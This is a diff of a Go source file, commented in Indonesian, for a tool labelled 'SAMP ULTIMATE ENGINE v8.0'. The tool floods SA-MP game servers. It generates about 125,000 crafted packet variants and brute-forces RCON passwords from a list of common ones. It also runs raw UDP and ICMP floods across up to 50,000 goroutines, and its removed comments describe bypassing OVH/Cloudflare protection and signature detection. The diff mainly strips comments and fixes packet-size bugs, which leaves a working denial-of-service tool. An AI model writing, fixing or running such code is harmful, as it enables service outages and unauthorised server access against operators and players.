@@ -16,7 +16,7 @@ import (
 	"time"
 )
 
-// ==================== TEMPLATE VARIABLES (DI-REPLACE OLEH main.py) ====================
+// ==================== TEMPLATE VARIABLES ====================
 var (
 	targetIP   = "{{.TargetIP}}"
 	targetPort = "{{.TargetPort}}"
@@ -25,119 +25,81 @@ var (
 	method     = "{{.Method}}"
 )
 
-// ==================== KONSTANTA PROTOKOL SAMP (100% VALID) ====================
+// ==================== KONSTANTA ====================
 const (
-	// Struktur Packet SAMP [^4^][^2^]:
-	// [4 bytes Prefix - Optional][4 bytes SAMP][4 bytes IP][2 bytes Port][1 byte Opcode][Payload]
-	// Total minimum: 11 bytes (tanpa prefix), 15 bytes (dengan prefix)
-	// Maximum: 512 bytes (server drop >512)
+	SAMP_MAGIC    = "SAMP"
+	SAMP_MIN_SIZE = 11  // Minimum: SAMP(4) + IP(4) + Port(2) + Opcode(1)
+	SAMP_MAX_SIZE = 512 // Maximum valid size
 	
-	SAMP_MAGIC = "SAMP"
-	
-	// Valid Opcodes SAMP
-	OP_INFO    = 0x69 // 'i' - Information
-	OP_RULES   = 0x72 // 'r' - Rules
-	OP_PLAYERS = 0x63 // 'c' - Players (Client list)
-	OP_DETAIL  = 0x64 // 'd' - Detailed player info
-	OP_PING    = 0x70 // 'p' - Ping (4 bytes random)
-	OP_RCON    = 0x78 // 'x' - RCON command
-	
-	// Protocol Limits [^4^]
-	SAMP_MIN_SIZE = 11  // Minimum valid packet size
-	SAMP_MAX_SIZE = 512 // Maximum before server drops
-	
-	// Network constants
-	MAX_THREADS    = 50000
-	SOCKET_BUF_SIZE = 16 * 1024 * 1024 // 16MB buffer
+	MAX_THREADS     = 50000
+	SOCKET_BUF_SIZE = 16 * 1024 * 1024
 )
 
 // ==================== GLOBAL STATE ====================
 var (
-	// Statistics (lock-free)
 	totalPackets uint64 = 0
 	totalBytes   uint64 = 0
 	startTime    time.Time
 	stopTime     time.Time
 	
-	// Target configuration
 	targetAddr      *net.UDPAddr
 	targetIPBytes   [4]byte
 	targetPortInt   int
-	targetPortBytes [2]byte // Little-endian [^4^]
+	targetPortBytes [2]byte
 	
-	// Configuration
 	cfg struct {
-		threadCount   int
-		durationSec   int
-		attackMethod  string
-		usePrefix     bool // 4-byte prefix bypass mode
-		enableSpoof   bool // Raw socket mode
-		burstMin      int
-		burstMax      int
+		threadCount  int
+		durationSec  int
+		attackMethod string
+		burstMin     int
+		burstMax     int
 	}
 	
-	// Connection pools
 	udpPool sync.Pool
 	rngPool sync.Pool
 	
-	// Variant pools (100,000+ total)
 	variants struct {
-		standard   [][]byte // 50,000 - Standard SAMP (no prefix)
-		withPrefix [][]byte // 50,000 - Dengan 4-byte prefix (bypass)
-		rcon       [][]byte // 10,000 - RCON brute force variants
-		ping       [][]byte // 10,000 - Ping variants dengan random data
-		invalid    [][]byte // 5,000 - Invalid opcodes untuk fuzzing
+		standard   [][]byte
+		withPrefix [][]byte
+		rcon       [][]byte
+		ping       [][]byte
+		invalid    [][]byte
 	}
 )
 
-// ==================== STRUCTS ====================
 type ConnPool struct {
 	conn *net.UDPConn
 	mu   sync.Mutex
 	id   uint64
 }
 
-// ==================== MAIN ENTRY ====================
+// ==================== MAIN ====================
 func main() {
-	// Initialize
 	if err := initConfig(); err != nil {
 		fmt.Fprintf(os.Stderr, "Init error: %v\n", err)
 		os.Exit(1)
 	}
 	
-	// Setup network
 	if err := setupNetwork(); err != nil {
 		fmt.Fprintf(os.Stderr, "Network error: %v\n", err)
 		os.Exit(1)
 	}
 	
-	// Generate 100k+ variants
 	generateVariants()
-	
-	// Initialize pools
 	initPools()
-	
-	// Print info
 	printBanner()
-	
-	// Execute attack
 	executeAttack()
-	
-	// Wait and show stats
 	waitAndReport()
 }
 
-// ==================== INITIALIZATION ====================
 func initConfig() error {
 	var err error
 	
-	// Parse duration
 	cfg.durationSec, err = strconv.Atoi(duration)
 	if err != nil || cfg.durationSec <= 0 {
 		cfg.durationSec = 60
 	}
 	
-	// Parse threads
 	baseThreads, _ := strconv.Atoi(threads)
 	if baseThreads <= 0 {
 		baseThreads = 1000
@@ -147,27 +109,14 @@ func initConfig() error {
 		cfg.threadCount = MAX_THREADS
 	}
 	
-	// Parse method
 	cfg.attackMethod = strings.ToUpper(strings.TrimSpace(method))
 	if cfg.attackMethod == "" {
 		cfg.attackMethod = "GOD"
 	}
 	
-	// Default settings untuk bypass
-	cfg.usePrefix = true
 	cfg.burstMin = 1
 	cfg.burstMax = 20
 	
-	// Cek raw socket capability (requires root)
-	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
-	if err == nil {
-		syscall.Close(fd)
-		cfg.enableSpoof = true
-	} else {
-		cfg.enableSpoof = false
-	}
-	
-	// Setup timing
 	stopTime = time.Now().Add(time.Duration(cfg.durationSec) * time.Second)
 	startTime = time.Now()
 	
@@ -175,21 +124,18 @@ func initConfig() error {
 }
 
 func setupNetwork() error {
-	// Parse port
 	port, err := strconv.Atoi(targetPort)
 	if err != nil {
 		return fmt.Errorf("invalid port: %v", err)
 	}
 	targetPortInt = port
 	
-	// Resolve address
 	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetIP, port))
 	if err != nil {
 		return fmt.Errorf("resolve failed: %v", err)
 	}
 	targetAddr = addr
 	
-	// Parse IP bytes (4 octets) [^4^]
 	parts := strings.Split(targetIP, ".")
 	if len(parts) != 4 {
 		return fmt.Errorf("invalid IP format")
@@ -202,8 +148,7 @@ func setupNetwork() error {
 		targetIPBytes[i] = byte(val)
 	}
 	
-	// Port bytes (Little Endian) [^4^]
-	// Byte 0: port & 0xFF, Byte 1: port >> 8 & 0xFF
+	// Little Endian port bytes [^4^]
 	targetPortBytes[0] = byte(port & 0xFF)
 	targetPortBytes[1] = byte((port >> 8) & 0xFF)
 	
@@ -220,7 +165,6 @@ func initPools() {
 				return nil
 			}
 			
-			// Optimasi socket
 			if file, err := conn.File(); err == nil {
 				fd := int(file.Fd())
 				syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, SOCKET_BUF_SIZE)
@@ -243,35 +187,31 @@ func initPools() {
 	}
 }
 
-// ==================== PACKET GENERATION (100,000+ VARIAN) ====================
+// ==================== PACKET GENERATION (FIXED) ====================
 func generateVariants() {
-	fmt.Printf("[*] Generating packet variants (100,000+)...\n")
+	fmt.Printf("[*] Generating packet variants...\n")
 	
-	// 1. Standard SAMP packets (50,000 varian) - Bytes: [SAMP][IP][Port][Opcode][Payload]
+	// Generate dengan size yang aman
 	variants.standard = make([][]byte, 50000)
 	for i := 0; i < 50000; i++ {
 		variants.standard[i] = buildSAMPPacket(i, false)
 	}
 	
-	// 2. With Prefix (50,000 varian) - Bytes: [Prefix][SAMP][IP][Port][Opcode][Payload]
 	variants.withPrefix = make([][]byte, 50000)
 	for i := 0; i < 50000; i++ {
 		variants.withPrefix[i] = buildSAMPPacket(i, true)
 	}
 	
-	// 3. RCON packets (10,000 varian) - Brute force
 	variants.rcon = make([][]byte, 10000)
 	for i := 0; i < 10000; i++ {
 		variants.rcon[i] = buildRCONPacket(i)
 	}
 	
-	// 4. Ping packets (10,000 varian) - Dengan 4-byte random data [^4^]
 	variants.ping = make([][]byte, 10000)
 	for i := 0; i < 10000; i++ {
 		variants.ping[i] = buildPingPacket(i)
 	}
 	
-	// 5. Invalid opcodes (5,000 varian) - Fuzzing untuk bypass
 	variants.invalid = make([][]byte, 5000)
 	for i := 0; i < 5000; i++ {
 		variants.invalid[i] = buildInvalidPacket(i)
@@ -282,45 +222,36 @@ func generateVariants() {
 		len(variants.ping), len(variants.invalid))
 }
 
-// buildSAMPPacket: Membuat packet SAMP yang 100% valid [^4^]
-// Structure: [4b Prefix?][4b SAMP][4b IP][2b Port][1b Opcode][0-491b Payload] = 11-512 bytes
 func buildSAMPPacket(variant int, usePrefix bool) []byte {
 	buf := new(bytes.Buffer)
 	
-	// Optional 4-byte prefix untuk bypass (0xFF, 0x00, Random, dll)
+	// Optional prefix
 	if usePrefix {
 		prefix := getPrefix(variant)
 		buf.Write(prefix)
 	}
 	
-	// Magic Header "SAMP" (Bytes 0-3 atau 4-7 tergantung prefix)
+	// Core SAMP structure [^4^]
 	buf.WriteString(SAMP_MAGIC)
-	
-	// IP Address (4 bytes, network order) - Bytes 4-7 atau 8-11
 	buf.Write(targetIPBytes[:])
-	
-	// Port (2 bytes, Little Endian) [^4^] - Bytes 8-9 atau 12-13
 	buf.Write(targetPortBytes[:])
+	buf.WriteByte(getOpcode(variant))
 	
-	// Opcode (1 byte) - Byte 10 atau 14
-	opcode := getOpcode(variant)
-	buf.WriteByte(opcode)
-	
-	// Payload untuk mencapai size 16-512 bytes
+	// Padding untuk mencapai target size (16-512 bytes)
 	currentSize := buf.Len()
-	targetSize := SAMP_MIN_SIZE + (variant % (SAMP_MAX_SIZE - SAMP_MIN_SIZE + 1))
-	
-	if targetSize > currentSize {
-		padding := make([]byte, targetSize-currentSize)
-		fillPattern(padding, variant)
-		buf.Write(padding)
+	if currentSize < SAMP_MAX_SIZE {
+		// Random size antara currentSize dan SAMP_MAX_SIZE
+		targetSize := currentSize + (variant % (SAMP_MAX_SIZE - currentSize + 1))
+		if targetSize > currentSize && targetSize <= SAMP_MAX_SIZE {
+			padding := make([]byte, targetSize-currentSize)
+			fillPattern(padding, variant)
+			buf.Write(padding)
+		}
 	}
 	
 	return buf.Bytes()
 }
 
-// buildRCONPacket: Struktur RCON yang valid [^4^]
-// [SAMP][IP][Port][0x78][PassLen(4b)][Password][CmdLen(4b)][Command]
 func buildRCONPacket(variant int) []byte {
 	buf := new(bytes.Buffer)
 	
@@ -328,9 +259,9 @@ func buildRCONPacket(variant int) []byte {
 	buf.WriteString(SAMP_MAGIC)
 	buf.Write(targetIPBytes[:])
 	buf.Write(targetPortBytes[:])
-	buf.WriteByte(OP_RCON)
+	buf.WriteByte(0x78) // RCON opcode
 	
-	// Passwords list (34 base + random suffix)
+	// Passwords dengan random suffix
 	passwords := []string{
 		"rcon", "password", "1234", "admin", "samp", "owner", "server",
 		"123456", "qwerty", "letmein", "gta", "sanandreas", "changeme",
@@ -347,7 +278,6 @@ func buildRCONPacket(variant int) []byte {
 		"exit", "query", "rcon_password", "message", "cmdlist", "varlist",
 	}
 	
-	// Password dengan random suffix (e.g., "rcon1234")
 	basePass := passwords[variant%len(passwords)]
 	suffix := strconv.Itoa(variant % 10000)
 	pass := basePass + suffix
@@ -357,54 +287,47 @@ func buildRCONPacket(variant int) []byte {
 	passBytes := []byte(pass)
 	cmdBytes := []byte(cmd)
 	
-	// Password length (4 bytes, little-endian) [^4^]
+	// Length-prefixed [^4^]
 	binary.Write(buf, binary.LittleEndian, uint32(len(passBytes)))
 	buf.Write(passBytes)
-	
-	// Command length (4 bytes, little-endian)
 	binary.Write(buf, binary.LittleEndian, uint32(len(cmdBytes)))
 	buf.Write(cmdBytes)
 	
-	// Pastikan size valid (truncate atau padding)
+	// Pastikan size valid
 	result := buf.Bytes()
 	if len(result) > SAMP_MAX_SIZE {
 		result = result[:SAMP_MAX_SIZE]
-	} else if len(result) < SAMP_MIN_SIZE {
-		padding := make([]byte, SAMP_MIN_SIZE-len(result))
-		result = append(result, padding...)
 	}
-	
 	return result
 }
 
-// buildPingPacket: Opcode 'p' dengan 4 bytes random data [^4^]
 func buildPingPacket(variant int) []byte {
 	buf := new(bytes.Buffer)
 	
 	buf.WriteString(SAMP_MAGIC)
 	buf.Write(targetIPBytes[:])
 	buf.Write(targetPortBytes[:])
-	buf.WriteByte(OP_PING)
+	buf.WriteByte(0x70) // Ping opcode
 	
-	// 4 bytes pseudo-random data [^4^]
+	// 4 bytes random data [^4^]
 	data := make([]byte, 4)
-	binary.BigEndian.PutUint32(data, uint32(variant*2654435761)) // LCG
+	binary.BigEndian.PutUint32(data, uint32(variant*2654435761))
 	buf.Write(data)
 	
-	// Padding jika perlu
-	if buf.Len() < SAMP_MIN_SIZE {
-		padding := make([]byte, SAMP_MIN_SIZE-buf.Len())
+	// Padding jika perlu (minimal 16 bytes)
+	if buf.Len() < 16 {
+		padding := make([]byte, 16-buf.Len())
 		buf.Write(padding)
 	}
 	
 	return buf.Bytes()
 }
 
-// buildInvalidPacket: Opcode invalid untuk fuzzing/bypass
+// FIX: buildInvalidPacket yang sebelumnya error
 func buildInvalidPacket(variant int) []byte {
 	buf := new(bytes.Buffer)
 	
-	// Tambahkan prefix untuk bypass signature detection
+	// Prefix
 	prefix := getPrefix(variant + 1000)
 	buf.Write(prefix)
 	
@@ -412,63 +335,68 @@ func buildInvalidPacket(variant int) []byte {
 	buf.Write(targetIPBytes[:])
 	buf.Write(targetPortBytes[:])
 	
-	// Opcode invalid (di luar 0x69, 0x72, 0x63, 0x64, 0x70, 0x78)
+	// Opcode invalid
 	invalidOps := []byte{0x00, 0xFF, 0x41, 0x42, 0x43, 0x44, 0x45, 0x50, 0x51, 0x52}
 	opcode := invalidOps[variant%len(invalidOps)]
 	buf.WriteByte(opcode)
 	
-	// Random payload
-	size := SAMP_MIN_SIZE + (variant % 100)
-	payload := make([]byte, size-buf.Len())
-	rand.Read(payload)
-	buf.Write(payload)
+	// FIX: Pastikan size calculation tidak negative
+	currentLen := buf.Len()
+	targetSize := 16 + (variant % 100) // 16-115 bytes
+	
+	// Safety check: hanya tambah padding jika targetSize > currentLen
+	if targetSize > currentLen && targetSize <= SAMP_MAX_SIZE {
+		paddingSize := targetSize - currentLen
+		if paddingSize > 0 { // Double check positive
+			payload := make([]byte, paddingSize)
+			rand.Read(payload)
+			buf.Write(payload)
+		}
+	}
 	
 	return buf.Bytes()
 }
 
-// ==================== HELPERS ====================
 func getPrefix(variant int) []byte {
 	prefixes := [][]byte{
-		{0xFF, 0xFF, 0xFF, 0xFF}, // Quake style
-		{0x00, 0x00, 0x00, 0x00}, // Null
-		{0xAA, 0xAA, 0xAA, 0xAA}, // Pattern AA
-		{0x55, 0x55, 0x55, 0x55}, // Pattern 55
-		{0xDE, 0xAD, 0xBE, 0xEF}, // DEADBEEF
-		{0xCA, 0xFE, 0xBA, 0xBE}, // CAFEBABE
+		{0xFF, 0xFF, 0xFF, 0xFF},
+		{0x00, 0x00, 0x00, 0x00},
+		{0xAA, 0xAA, 0xAA, 0xAA},
+		{0x55, 0x55, 0x55, 0x55},
+		{0xDE, 0xAD, 0xBE, 0xEF},
+		{0xCA, 0xFE, 0xBA, 0xBE},
 	}
 	
 	if variant%10 < 6 {
 		return prefixes[variant%len(prefixes)]
 	}
 	
-	// Random prefix
 	p := make([]byte, 4)
 	rand.Read(p)
 	return p
 }
 
 func getOpcode(variant int) byte {
-	// 6 valid opcodes
-	opcodes := []byte{OP_INFO, OP_RULES, OP_PLAYERS, OP_DETAIL, OP_PING, OP_RCON}
+	opcodes := []byte{0x69, 0x72, 0x63, 0x64, 0x70, 0x78} // i, r, c, d, p, x
 	return opcodes[variant%len(opcodes)]
 }
 
 func fillPattern(data []byte, variant int) {
 	pattern := variant % 8
 	switch pattern {
-	case 0: // Random
+	case 0:
 		rand.Read(data)
-	case 1: // Zeros
-		// Already zero
-	case 2: // 0xFF
+	case 1:
+		// Zeros - already zero
+	case 2:
 		for i := range data {
 			data[i] = 0xFF
 		}
-	case 3: // Sequential
+	case 3:
 		for i := range data {
 			data[i] = byte(i % 256)
 		}
-	case 4: // Alternating AA/55
+	case 4:
 		for i := range data {
 			if i%2 == 0 {
 				data[i] = 0xAA
@@ -476,15 +404,15 @@ func fillPattern(data []byte, variant int) {
 				data[i] = 0x55
 			}
 		}
-	case 5: // SAMP pattern
+	case 5:
 		for i := range data {
 			data[i] = SAMP_MAGIC[i%4]
 		}
-	case 6: // Incremental from variant
+	case 6:
 		for i := range data {
 			data[i] = byte((variant + i) % 256)
 		}
-	case 7: // Timestamp
+	case 7:
 		ts := uint32(time.Now().Unix())
 		for i := range data {
 			data[i] = byte(ts >> (8 * (i % 4)))
@@ -492,10 +420,9 @@ func fillPattern(data []byte, variant int) {
 	}
 }
 
-// ==================== ATTACK EXECUTION ====================
+// ==================== ATTACK ====================
 func executeAttack() {
-	fmt.Printf("[ATTACK] Method: %s | Threads: %d | Target: %s:%d\n", 
-		cfg.attackMethod, cfg.threadCount, targetIP, targetPortInt)
+	fmt.Printf("[ATTACK] Method: %s | Threads: %d\n", cfg.attackMethod, cfg.threadCount)
 	
 	switch cfg.attackMethod {
 	case "SAMP":
@@ -512,17 +439,14 @@ func executeAttack() {
 }
 
 func executeSAMPAttack() {
-	fmt.Printf("[VECTOR] SAMP Protocol Attack (100k+ variants)\n")
-	fmt.Printf("[INFO] 50%% Standard + 30%% Prefix + 20%% RCON\n")
+	fmt.Printf("[VECTOR] SAMP Protocol Attack\n")
 	
 	var wg sync.WaitGroup
 	
-	// Distribusi threads
 	stdCount := cfg.threadCount * 50 / 100
 	prefixCount := cfg.threadCount * 30 / 100
 	rconCount := cfg.threadCount - stdCount - prefixCount
 	
-	// Standard packets
 	for i := 0; i < stdCount; i++ {
 		wg.Add(1)
 		go func(id int) {
@@ -531,7 +455,6 @@ func executeSAMPAttack() {
 		}(i)
 	}
 	
-	// Prefix packets (bypass mode)
 	for i := 0; i < prefixCount; i++ {
 		wg.Add(1)
 		go func(id int) {
@@ -540,7 +463,6 @@ func executeSAMPAttack() {
 		}(i)
 	}
 	
-	// RCON packets
 	for i := 0; i < rconCount; i++ {
 		wg.Add(1)
 		go func(id int) {
@@ -562,22 +484,17 @@ func workerSAMP(workerID int, pool [][]byte) {
 	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
 	
 	for time.Now().Before(stopTime) {
-		// Pilih packet random dari pool
 		idx := rng.Intn(len(pool))
 		packet := pool[idx]
 		
-		// Burst dengan variasi 1-20 packets
 		burst := cfg.burstMin + rng.Intn(cfg.burstMax-cfg.burstMin+1)
 		for b := 0; b < burst; b++ {
 			sendPacket(conn, packet)
-			
-			// Micro-delay antara burst untuk menghindari pattern
 			if b < burst-1 {
-				spinWait(50 + rng.Intn(100)) // 50-150ns
+				spinWait(50 + rng.Intn(100))
 			}
 		}
 		
-		// Yield periodically
 		if workerID%100 == 0 {
 			runtime.Gosched()
 		}
@@ -585,7 +502,7 @@ func workerSAMP(workerID int, pool [][]byte) {
 }
 
 func executeUDPFlood() {
-	fmt.Printf("[VECTOR] Raw UDP Flood (Bypass OVH/Cloudflare)\n")
+	fmt.Printf("[VECTOR] Raw UDP Flood\n")
 	
 	var wg sync.WaitGroup
 	
@@ -603,12 +520,10 @@ func executeUDPFlood() {
 			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
 			
 			for time.Now().Before(stopTime) {
-				// Random size 16-512
 				size := SAMP_MIN_SIZE + rng.Intn(SAMP_MAX_SIZE-SAMP_MIN_SIZE+1)
 				payload := make([]byte, size)
 				rng.Read(payload)
 				
-				// Tambahkan SAMP header di posisi random untuk confusion
 				if id%3 == 0 {
 					copy(payload[4:], []byte(SAMP_MAGIC))
 				}
@@ -629,7 +544,6 @@ func executeMixedAttack() {
 	sampT := cfg.threadCount * 60 / 100
 	udpT := cfg.threadCount - sampT
 	
-	// SAMP component
 	for i := 0; i < sampT; i++ {
 		wg.Add(1)
 		go func(id int) {
@@ -642,7 +556,6 @@ func executeMixedAttack() {
 		}(i)
 	}
 	
-	// UDP component
 	for i := 0; i < udpT; i++ {
 		wg.Add(1)
 		go func(id int) {
@@ -669,7 +582,7 @@ func executeMixedAttack() {
 }
 
 func executeGodMode() {
-	fmt.Printf("[VECTOR] GOD MODE - Total Annihilation\n")
+	fmt.Printf("[VECTOR] GOD MODE\n")
 	
 	vectors := map[string]int{
 		"STANDARD": cfg.threadCount * 25 / 100,
@@ -751,7 +664,7 @@ func executeGodMode() {
 					if err != nil { return }
 					defer c.Close()
 					pkt := make([]byte, 64)
-					pkt[0] = 8 // Echo
+					pkt[0] = 8
 					for time.Now().Before(stopTime) {
 						c.Write(pkt)
 						atomic.AddUint64(&totalPackets, 1)
@@ -765,7 +678,7 @@ func executeGodMode() {
 	wg.Wait()
 }
 
-// ==================== UTILITY FUNCTIONS ====================
+// ==================== UTILITIES ====================
 func getConn() *ConnPool {
 	c := udpPool.Get()
 	if c == nil {
@@ -806,12 +719,9 @@ func printBanner() {
 	fmt.Printf("\n")
 	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
 	fmt.Printf("║              SAMP ULTIMATE ENGINE v8.0 - PROTOCOL PERFECTION                 ║\n")
-	fmt.Printf("║        100%% Valid Structure | 125k Variants | Bypass OVH/Cloudflare          ║\n")
 	fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════╣\n")
 	fmt.Printf("║ Target: %-22s Port: %-8d Threads: %-10d              ║\n", targetIP, targetPortInt, cfg.threadCount)
-	fmt.Printf("║ Duration: %-20ds Method: %-12s Prefix: %-8v              ║\n", cfg.durationSec, cfg.attackMethod, cfg.usePrefix)
-	fmt.Printf("║ Size: %d-%d bytes | Opcodes: 6 Valid + Invalid Fuzzing | Burst: %d-%d           ║\n", 
-		SAMP_MIN_SIZE, SAMP_MAX_SIZE, cfg.burstMin, cfg.burstMax)
+	fmt.Printf("║ Duration: %-20ds Method: %-12s                                   ║\n", cfg.durationSec, cfg.attackMethod)
 	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
 	fmt.Printf("\n")
 }
